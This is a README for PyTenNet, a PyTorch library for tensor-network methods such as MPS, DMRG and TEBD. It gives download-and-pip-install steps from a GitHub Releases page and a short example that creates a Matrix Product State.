## 🚀 Getting Started

Welcome to PyTenNet! This application simplifies exploring tensor networks using the power of pure PyTorch. It supports techniques like Matrix Product States (MPS), Matrix Product Operators (MPO), Density Matrix Renormalization Group (DMRG), and Time-Evolving Block Decimation (TEBD). Whether you are a student or a researcher, PyTenNet can help you dive into many-body physics efficiently.

## 📋 Features

- **User-Friendly Interface:** No coding skills needed! 
- **Support for Various Methods:** Easily implement MPS, MPO, DMRG, and TEBD.
- **Research Ready:** Enhanced performance for quantum mechanics simulations.
- **Documentation:** Clear guides and examples included.
  
## 🖥️ System Requirements

To run PyTenNet, you need:

- Operating System: Windows, macOS, or Linux
- Installed Software: Python (version 3.6 or higher), Pytorch (latest version recommended)
- Hardware: Minimum 4 GB RAM, ideally 8 GB or more for complex simulations.

## 📥 Download & Install

To get started with PyTenNet, you need to download it from the Releases page. 

1. **Visit this page to download:** [PyTenNet Releases](https://github.com/lonelyratt/PyTenNet/releases).
   
2. On the Releases page, look for the latest version.

3. Click the link for the file type compatible with your operating system (e.g., `.whl` for Windows).

4. Save the file to a known location on your computer.

5. Open your command line or terminal.

6. Navigate to the directory where you saved the file. For example, if you saved it in the Downloads folder, type:
   ```
   cd Downloads
   ```

7. Install the package by running:
   ```
   pip install PyTenNet-<version>.whl
   ```
   Replace `<version>` with the actual version number of the file you downloaded.

8. Once installed, you can start using PyTenNet in your Python scripts.

## 🎓 Basic Usage

Here’s a simple example of how to start using PyTenNet after installation:

```python
import torch
from pytennet import MPS

# Create a simple Matrix Product State
mps = MPS(num_sites=10, bond_dimension=4)

# Display the MPS
print(mps)
```

This example initializes a Matrix Product State with 10 sites and a bond dimension of 4. Modify the parameters as needed for your research.
